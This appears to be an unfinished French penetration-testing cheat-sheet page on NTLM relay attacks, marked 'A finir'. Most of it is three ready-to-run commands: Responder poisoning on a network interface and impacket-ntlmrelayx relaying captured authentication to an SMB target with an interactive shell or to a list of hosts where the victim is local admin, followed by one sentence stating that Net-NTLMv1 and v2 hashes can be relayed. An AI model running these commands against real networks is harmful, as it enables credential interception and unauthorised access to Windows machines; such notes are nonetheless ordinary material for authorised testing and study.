---
description: A finir
---

# NTLM Relay

```
sudo responder -I eth0 -vrd
sudo impacket-ntlmrelayx -t smb://<IP> -i -debug
sudo impacket-ntlmrelayx -tf IP_postes_localadmin.txt -smb2support
```

Les _hashs_ NT utilisé dans la version 1 et 2 du protocole NTLM (a.k.a Net-NTLMv1-SSP et Net-NTLMv2-SSP) peuvent être relayés.
